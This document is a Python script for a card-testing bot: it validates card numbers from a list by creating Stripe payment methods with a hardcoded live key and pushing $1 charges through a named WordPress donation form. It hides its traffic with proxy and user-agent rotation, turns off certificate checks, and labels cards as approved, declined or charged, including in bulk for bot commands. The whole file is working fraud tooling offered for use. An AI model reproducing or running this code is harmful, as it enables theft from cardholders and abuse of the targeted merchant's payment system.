import requests
import random
import time
import os
import re
import json
import uuid
import string
from urllib.parse import urlparse
from requests.adapters import HTTPAdapter
from requests.packages.urllib3.util.retry import Retry
from user_agent import generate_user_agent

# Developer info
dev = "@mhitzxg"

# Configuration - YOUR ORIGINAL CONFIG
pkk = 'pk_live_51PvhEE07g9MK9dNZrYzbLv9pilyugsIQn0DocUZSpBWIIqUmbYavpiAj1iENvS7txtMT2gBnWVNvKk2FHul4yg1200ooq8sVnV'
fn = '2d74654657' 
aj = 'https://allcoughedup.com/wp-admin/admin-ajax.php'
ref = 'https://allcoughedup.com/registry/'

# Website identifiers - YOUR ORIGINAL
guid = 'beed82b8-9f7d-4585-8162-8fa6d92c010c1b6c9b'
muid = 'c70ee7f6-0caf-4555-b545-a1c2d4ee30eb88e211'
sid = 'a1772a92-62c1-4d2e-b5c3-e4939a09a4737b9bc9'

# User agent
us = 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36'

def get_rotating_user_agent():
    agents = [
        generate_user_agent(device_type='mobile'),
        generate_user_agent(device_type='mobile', os=('android', 'ios')),
        generate_user_agent(navigator='chrome'),
        generate_user_agent(navigator='firefox'),
    ]
    return random.choice(agents)

def parse_proxy(proxy_str):
    """Universal proxy parser supporting all formats"""
    try:
        proxy_str = proxy_str.strip()
        
        if '@' in proxy_str:
            auth_part, server_part = proxy_str.split('@', 1)
            username, password = auth_part.split(':', 1)
            ip, port = server_part.split(':', 1)
        else:
            parts = proxy_str.split(':')
            if len(parts) == 4:
                ip, port, username, password = parts
            elif len(parts) == 2:
                ip, port = parts
                username, password = None, None
            else:
                ip, port = parts[0], parts[1]
                username, password = None, None
        
        if username and password:
            proxy_url = f'http://{username}:{password}@{ip}:{port}'
        else:
            proxy_url = f'http://{ip}:{port}'
        
        return {'http': proxy_url, 'https': proxy_url}
    except:
        return None

def requests_retry_session(
    retries=3,
    backoff_factor=0.3,
    status_forcelist=(500, 502, 504),
    session=None,
):
    """Create a requests session with retry logic"""
    session = session or requests.Session()
    retry = Retry(
        total=retries,
        read=retries,
        connect=retries,
        backoff_factor=backoff_factor,
        status_forcelist=status_forcelist,
    )
    adapter = HTTPAdapter(max_retries=retry)
    session.mount('http://', adapter)
    session.mount('https://', adapter)
    return session

def get_random_proxy():
    """Get a random proxy from proxy.txt file"""
    try:
        with open('proxy.txt', 'r') as f:
            proxies = f.readlines()
            if not proxies:
                return None
            
            proxy_str = random.choice(proxies).strip()
            return parse_proxy(proxy_str)
    except:
        return None

def get_bin_info(bin_number):
    """Get BIN information using multiple APIs"""
    if not bin_number or len(bin_number) < 6:
        return {
            'bank': 'Unavailable',
            'country': 'Unknown',
            'brand': 'Unknown',
            'type': 'Unknown',
            'level': 'Unknown',
            'emoji': ''
        }
    
    bin_code = bin_number[:6]
    apis_to_try = [
        f"https://lookup.binlist.net/{bin_code}",
        f"https://bins.antipublic.cc/bins/{bin_code}",
    ]
    
    headers = {
        'Accept': 'application/json',
        'User-Agent': get_rotating_user_agent()
    }
    
    for api_url in apis_to_try:
        try:
            response = requests.get(api_url, headers=headers, timeout=10, verify=False)
            if response.status_code == 200:
                data = response.json()
                bin_info = {}
                
                if 'binlist.net' in api_url:
                    bin_info = {
                        'bank': data.get('bank', {}).get('name', 'Unavailable'),
                        'country': data.get('country', {}).get('name', 'Unknown'),
                        'brand': data.get('scheme', 'Unknown'),
                        'type': data.get('type', 'Unknown'),
                        'level': data.get('brand', 'Unknown'),
                        'emoji': get_country_emoji(data.get('country', {}).get('alpha2', ''))
                    }
                elif 'antipublic.cc' in api_url:
                    bin_info = {
                        'bank': data.get('bank', 'Unavailable'),
                        'country': data.get('country', 'Unknown'),
                        'brand': data.get('vendor', 'Unknown'),
                        'type': data.get('type', 'Unknown'),
                        'level': data.get('level', 'Unknown'),
                        'emoji': get_country_emoji(data.get('country_code', ''))
                    }
                
                for key in ['bank', 'country', 'brand', 'type', 'level']:
                    if not bin_info.get(key) or bin_info[key] in ['', 'N/A', 'None', 'null']:
                        bin_info[key] = 'Unknown'
                
                if bin_info['bank'] not in ['Unavailable', 'Unknown'] or bin_info['brand'] != 'Unknown':
                    return bin_info
                    
        except:
            continue
    
    return {
        'bank': 'Unavailable',
        'country': 'Unknown',
        'brand': 'Unknown',
        'type': 'Unknown',
        'level': 'Unknown',
        'emoji': ''
    }

def get_country_emoji(country_code):
    """Convert country code to emoji"""
    if not country_code or len(country_code) != 2:
        return ''
    try:
        country_code = country_code.upper()
        return ''.join(chr(127397 + ord(char)) for char in country_code)
    except:
        return ''

def extract_error_from_response(response_text):
    """Extract error message from response text"""
    try:
        if response_text.strip():
            try:
                data = json.loads(response_text)
                if isinstance(data, dict):
                    if 'error' in data:
                        error_msg = data['error'].get('message', '')
                        if error_msg:
                            return error_msg
                    
                    if 'data' in data and 'error' in data['data']:
                        error_msg = data['data']['error'].get('message', '')
                        if error_msg:
                            return error_msg
                    
                    if 'message' in data:
                        return data['message']
            except:
                pass
        
        patterns = [
            r'"message"\s*:\s*"([^"]+)"',
            r'"error"\s*:\s*{[^}]*"message"\s*:\s*"([^"]+)"',
            r'error\s*:\s*"([^"]+)"',
            r'decline[^"]*"([^"]+)"',
            r'declined[^"]*"([^"]+)"',
            r'incorrect[^"]*"([^"]+)"',
            r'invalid[^"]*"([^"]+)"',
            r'expired[^"]*"([^"]+)"',
            r'cvc[^"]*"([^"]+)"',
            r'security[^"]*"([^"]+)"',
        ]
        
        for pattern in patterns:
            match = re.search(pattern, response_text, re.IGNORECASE)
            if match:
                error_msg = match.group(1)
                error_msg = error_msg.replace('\\"', '"').replace('\\/', '/')
                return error_msg
        
        response_lower = response_text.lower()
        error_indicators = [
            ('declined', 'Your card was declined.'),
            ('insufficient', 'Your card has insufficient funds.'),
            ('expired', 'Your card has expired.'),
            ('invalid', 'Your card number is invalid.'),
            ('cvc', 'Your card\'s security code is incorrect.'),
            ('security', 'Your card\'s security code is incorrect.'),
            ('incorrect_cvc', 'Your card\'s security code is incorrect.'),
            ('do_not_honor', 'Your card was declined.'),
            ('pickup_card', 'Your card has been reported lost or stolen.'),
            ('restricted_card', 'Your card is restricted.'),
            ('card_not_supported', 'Your card is not supported.'),
            ('generic_decline', 'Your card was declined.'),
            ('transaction_not_allowed', 'Transaction not allowed.'),
        ]
        
        for indicator, message in error_indicators:
            if indicator in response_lower:
                return message
        
        return "Card declined."
        
    except:
        return "Card declined."

def get_final_message(response_text, response_obj=None):
    """Extract final user-friendly message from response"""
    try:
        if response_obj and hasattr(response_obj, 'json'):
            try:
                data = response_obj.json()
                if isinstance(data, dict):
                    if data.get('success') == True:
                        return "CHARGED 1$"
                    
                    if 'error' in data:
                        error_msg = data['error'].get('message', '')
                        if error_msg:
                            return error_msg
                    
                    if 'message' in data:
                        return data['message']
            except:
                pass
        
        error_msg = extract_error_from_response(response_text)
        return error_msg
    except:
        return "Unknown response"

def test_charge(cc_line):
    start_time = time.time()
    
    try:
        time.sleep(random.uniform(0.5, 1.5))
        
        parts = cc_line.strip().split('|')
        if len(parts) < 4:
            ccn, mm, yy, cvc = "0000000000000000", "01", "2025", "123"
        else:
            ccn, mm, yy, cvc = parts[0], parts[1], parts[2], parts[3]
        
        # Get BIN information FIRST (before any other operations)
        bin_info = get_bin_info(ccn[:6])
        
        # YOUR ORIGINAL STRIPE API LOGIC
        headers_stripe = {
            'authority': 'api.stripe.com',
            'accept': 'application/json',
            'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com',
            'referer': 'https://js.stripe.com/',
            'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-site',
            'user-agent': us
        }

        # Generate random values for Stripe request
        time_on_page = random.randint(100000, 200000)
        client_session_id = f"{random.randint(10000000, 99999999)}-{random.randint(1000, 9999)}-{random.randint(1000, 9999)}-{random.randint(1000, 9999)}-{random.randint(100000000000, 999999999999)}"
        
        # Convert year if needed
        if len(str(yy)) == 2:
            yy_full = 2000 + int(yy)
        else:
            yy_full = int(yy)
        
        # Stripe API data - YOUR ORIGINAL DATA
        data_stripe = (
            f'type=card&card[number]={ccn}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy_full}&'
            f'guid={guid}&muid={muid}&sid={sid}&pasted_fields=number&'
            f'payment_user_agent=stripe.js%2F1f014c0569%3B+stripe-js-v3%2F1f014c0569%3B+card-element&'
            f'referrer={ref}&time_on_page={time_on_page}&'
            f'client_attribution_metadata[client_session_id]={client_session_id}&'
            f'client_attribution_metadata[merchant_integration_source]=elements&'
            f'client_attribution_metadata[merchant_integration_subtype]=card-element&'
            f'client_attribution_metadata[merchant_integration_version]=2017&'
            f'key={pkk}'
        )

        # Get proxy
        proxy_dict = get_random_proxy()
        
        # Make Stripe API request with retry logic
        max_retries = 3
        for retry_count in range(max_retries):
            try:
                # Create session with retry logic
                session = requests_retry_session(retries=2, backoff_factor=0.5)
                
                if proxy_dict:
                    response_stripe = session.post('https://api.stripe.com/v1/payment_methods', 
                                                  headers=headers_stripe, 
                                                  data=data_stripe,
                                                  proxies=proxy_dict,
                                                  timeout=30,
                                                  verify=False)
                else:
                    response_stripe = session.post('https://api.stripe.com/v1/payment_methods', 
                                                  headers=headers_stripe, 
                                                  data=data_stripe,
                                                  timeout=30,
                                                  verify=False)
                break  # Success, break out of retry loop
                
            except (requests.exceptions.SSLError, 
                    requests.exceptions.ConnectionError,
                    requests.exceptions.Timeout,
                    requests.exceptions.RequestException) as e:
                
                if retry_count < max_retries - 1:
                    time.sleep(2 ** retry_count)  # Exponential backoff
                    continue
                else:
                    # All retries failed
                    elapsed_time = time.time() - start_time
                    error_msg = str(e)
                    
                    # Handle specific SSL error
                    if "SSL: UNEXPECTED_EOF_WHILE_READING" in error_msg or "SSLEOFError" in error_msg:
                        error_msg = "SSL Connection Error - Proxy/Network Issue"
                    
                    return f"""
❌ CONNECTION ERROR

💳𝗖𝗖 ⇾ {ccn}|{mm}|{yy}|{cvc}
🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ {error_msg}
💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Stripe Charge  - 1$

📚𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {bin_info['brand']} - {bin_info['type']} - {bin_info['level']}
🏛️𝗕𝗮𝗻𝗸: {bin_info['bank']}
🌎𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {bin_info['country']} {bin_info['emoji']}
🕒𝗧𝗼𝗼𝗸 {elapsed_time:.2f}𝘀

🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
"""
        
        elapsed_time = time.time() - start_time
        
        if response_stripe.status_code != 200:
            response_text = response_stripe.text
            error_msg = get_final_message(response_text, response_stripe)
            
            # Check for APPROVED responses (CVC incorrect or insufficient funds)
            if "Your card's security code is incorrect." in error_msg or "security code is incorrect" in error_msg.lower():
                return f"""
✅ APPROVED CC

💳𝗖𝗖 ⇾ {ccn}|{mm}|{yy}|{cvc}
🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ {error_msg}
💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Stripe Charge  - 1$

📚𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {bin_info['brand']} - {bin_info['type']} - {bin_info['level']}
🏛️𝗕𝗮𝗻𝗸: {bin_info['bank']}
🌎𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {bin_info['country']} {bin_info['emoji']}
🕒𝗧𝗼𝗼𝗸 {elapsed_time:.2f}𝘀

🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
"""
            
            if "Your card has insufficient funds." in error_msg or "insufficient funds" in error_msg.lower():
                return f"""
✅ APPROVED CC

💳𝗖𝗖 ⇾ {ccn}|{mm}|{yy}|{cvc}
🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ {error_msg}
💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Stripe Charge  - 1$

📚𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {bin_info['brand']} - {bin_info['type']} - {bin_info['level']}
🏛️𝗕𝗮𝗻𝗸: {bin_info['bank']}
🌎𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {bin_info['country']} {bin_info['emoji']}
🕒𝗧𝗼𝗼𝗸 {elapsed_time:.2f}𝘀

🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
"""
            
            return f"""
❌ DECLINED CC

💳𝗖𝗖 ⇾ {ccn}|{mm}|{yy}|{cvc}
🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ {error_msg}
💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Stripe Charge  - 1$

📚𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {bin_info['brand']} - {bin_info['type']} - {bin_info['level']}
🏛️𝗕𝗮𝗻𝗸: {bin_info['bank']}
🌎𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {bin_info['country']} {bin_info['emoji']}
🕒𝗧𝗼𝗼𝗸 {elapsed_time:.2f}𝘀

🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
"""
        
        stripe_json = response_stripe.json()
        
        if 'error' in stripe_json:
            error_msg = stripe_json['error'].get('message', 'Unknown Stripe Error')
            
            # Check for APPROVED responses
            if "Your card's security code is incorrect." in error_msg or "security code is incorrect" in error_msg.lower():
                return f"""
✅ APPROVED CC

💳𝗖𝗖 ⇾ {ccn}|{mm}|{yy}|{cvc}
🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ {error_msg}
💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Stripe Charge  - 1$

📚𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {bin_info['brand']} - {bin_info['type']} - {bin_info['level']}
🏛️𝗕𝗮𝗻𝗸: {bin_info['bank']}
🌎𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {bin_info['country']} {bin_info['emoji']}
🕒𝗧𝗼𝗼𝗸 {elapsed_time:.2f}𝘀

🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
"""
            
            if "Your card has insufficient funds." in error_msg or "insufficient funds" in error_msg.lower():
                return f"""
✅ APPROVED CC

💳𝗖𝗖 ⇾ {ccn}|{mm}|{yy}|{cvc}
🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ {error_msg}
💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Stripe Charge  - 1$

📚𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {bin_info['brand']} - {bin_info['type']} - {bin_info['level']}
🏛️𝗕𝗮𝗻𝗸: {bin_info['bank']}
🌎𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {bin_info['country']} {bin_info['emoji']}
🕒𝗧𝗼𝗼𝗸 {elapsed_time:.2f}𝘀

🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
"""
            
            return f"""
❌ DECLINED CC

💳𝗖𝗖 ⇾ {ccn}|{mm}|{yy}|{cvc}
🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ {error_msg}
💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Stripe Charge  - 1$

📚𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {bin_info['brand']} - {bin_info['type']} - {bin_info['level']}
🏛️𝗕𝗮𝗻𝗸: {bin_info['bank']}
🌎𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {bin_info['country']} {bin_info['emoji']}
🕒𝗧𝗼𝗼𝗸 {elapsed_time:.2f}𝘀

🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
"""
        
        payment_method_id = stripe_json["id"]
        
        # AJAX request cookies and headers
        cookies_ajax = {
            '__stripe_mid': muid,
            '__stripe_sid': sid,
        }

        headers_ajax = {
            'authority': 'allcoughedup.com',
            'accept': '*/*',
            'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'origin': 'https://allcoughedup.com',
            'referer': ref,
            'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': us,
            'x-requested-with': 'XMLHttpRequest',
        }

        params_ajax = {
            't': int(time.time() * 1000),
        }

        data_ajax = {
            'data': (
                f'__fluent_form_embded_post_id=3612&_fluentform_4_fluentformnonce={fn}&'
                f'_wp_http_referer=%2Fregistry%2F&names%5Bfirst_name%5D=diwas%20Khatri&'
                f'email=mhitzxg%40mechanicspedia.com&custom-payment-amount=1&'
                f'description=Thanks%20%3A-%20%40zx&payment_method=stripe&'
                f'__stripe_payment_method_id={payment_method_id}'
            ),
            'action': 'fluentform_submit',
            'form_id': '4',
        }

        time.sleep(random.uniform(1, 2))
        
        # Make final AJAX request with retry logic
        for retry_count in range(max_retries):
            try:
                # Create session with retry logic for AJAX request
                ajax_session = requests_retry_session(retries=2, backoff_factor=0.5)
                
                if proxy_dict:
                    response_ajax = ajax_session.post(
                        aj,
                        params=params_ajax,
                        cookies=cookies_ajax,
                        headers=headers_ajax,
                        data=data_ajax,
                        proxies=proxy_dict,
                        timeout=30,
                        verify=False
                    )
                else:
                    response_ajax = ajax_session.post(
                        aj,
                        params=params_ajax,
                        cookies=cookies_ajax,
                        headers=headers_ajax,
                        data=data_ajax,
                        timeout=30,
                        verify=False
                    )
                break  # Success, break out of retry loop
                
            except (requests.exceptions.SSLError, 
                    requests.exceptions.ConnectionError,
                    requests.exceptions.Timeout,
                    requests.exceptions.RequestException) as e:
                
                if retry_count < max_retries - 1:
                    time.sleep(2 ** retry_count)  # Exponential backoff
                    continue
                else:
                    # All retries failed
                    error_msg = str(e)
                    if "SSL: UNEXPECTED_EOF_WHILE_READING" in error_msg or "SSLEOFError" in error_msg:
                        error_msg = "SSL Connection Error - Proxy/Network Issue"
                    
                    return f"""
❌ AJAX CONNECTION ERROR

💳𝗖𝗖 ⇾ {ccn}|{mm}|{yy}|{cvc}
🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ {error_msg}
💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Stripe Charge  - 1$

📚𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {bin_info['brand']} - {bin_info['type']} - {bin_info['level']}
🏛️𝗕𝗮𝗻𝗸: {bin_info['bank']}
🌎𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {bin_info['country']} {bin_info['emoji']}
🕒𝗧𝗼𝗼𝗸 {elapsed_time:.2f}𝘀

🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
"""
        
        # Get final message
        response_text = response_ajax.text
        final_message = get_final_message(response_text, response_ajax)
        elapsed_time = time.time() - start_time
        
        # Check for success (CHARGED 1$ should only show when actually charged)
        response_text_lower = response_text.lower()
        
        # Only show "CHARGED 1$" when we have actual success
        if (final_message == "CHARGED 1$" or 
            'success' in response_text_lower and 'true' in response_text_lower or
            any(keyword in response_text_lower for keyword in ['payment successful', 'thank you', 'approved', 'charged', 'success', '"success":true'])):
            
            return f"""
✅ APPROVED CC

💳𝗖𝗖 ⇾ {ccn}|{mm}|{yy}|{cvc}
🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ CHARGED 1$
💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Stripe Charge  - 1$

📚𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {bin_info['brand']} - {bin_info['type']} - {bin_info['level']}
🏛️𝗕𝗮𝗻𝗸: {bin_info['bank']}
🌎𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {bin_info['country']} {bin_info['emoji']}
🕒𝗧𝗼𝗼𝗸 {elapsed_time:.2f}𝘀

🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
"""
        
        # Check for APPROVED responses (CVC incorrect or insufficient funds)
        if "Your card's security code is incorrect." in final_message or "security code is incorrect" in final_message.lower():
            return f"""
✅ APPROVED CC

💳𝗖𝗖 ⇾ {ccn}|{mm}|{yy}|{cvc}
🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ {final_message}
💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Stripe Charge  - 1$

📚𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {bin_info['brand']} - {bin_info['type']} - {bin_info['level']}
🏛️𝗕𝗮𝗻𝗸: {bin_info['bank']}
🌎𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {bin_info['country']} {bin_info['emoji']}
🕒𝗧𝗼𝗼𝗸 {elapsed_time:.2f}𝘀

🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
"""
        
        if "Your card has insufficient funds." in final_message or "insufficient funds" in final_message.lower():
            return f"""
✅ APPROVED CC

💳𝗖𝗖 ⇾ {ccn}|{mm}|{yy}|{cvc}
🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ {final_message}
💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Stripe Charge  - 1$

📚𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {bin_info['brand']} - {bin_info['type']} - {bin_info['level']}
🏛️𝗕𝗮𝗻𝗸: {bin_info['bank']}
🌎𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {bin_info['country']} {bin_info['emoji']}
🕒𝗧𝗼𝗼𝗸 {elapsed_time:.2f}𝘀

🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
"""
        
        # Otherwise, it's declined
        return f"""
❌ DECLINED CC

💳𝗖𝗖 ⇾ {ccn}|{mm}|{yy}|{cvc}
🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ {final_message}
💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Stripe Charge  - 1$

📚𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {bin_info['brand']} - {bin_info['type']} - {bin_info['level']}
🏛️𝗕𝗮𝗻𝗸: {bin_info['bank']}
🌎𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {bin_info['country']} {bin_info['emoji']}
🕒𝗧𝗼𝗼𝗸 {elapsed_time:.2f}𝘀

🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
"""
                
    except Exception as e:
        elapsed_time = time.time() - start_time
        return f"""
❌ ERROR

💳𝗖𝗖 ⇾ {cc_line.strip()}
🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ {str(e)}
💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Stripe Charge  - 1$

📚𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: Unknown - Unknown - Unknown
🏛️𝗕𝗮𝗻𝗸: Unavailable
🌎𝗖𝗼𝘂𝗻𝘁𝗿𝘆: Unknown 🏳️
🕒𝗧𝗼𝗼𝗸 {elapsed_time:.2f}𝘀

🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
"""

# Single CC check function for /st command
def check_single_cc(cc_line):
    return test_charge(cc_line)

# Mass CC check function for /mst command  
def check_mass_cc(cc_lines):
    """Process multiple CCs - EXACTLY LIKE YOUR OLD FILE"""
    results = []
    for cc_line in cc_lines:
        try:
            result = test_charge(cc_line.strip())
            results.append(result)
            # Add delay between requests
            time.sleep(random.uniform(1, 2))
        except Exception as e:
            results.append(f"❌ Error processing card: {str(e)}")
    
    return results
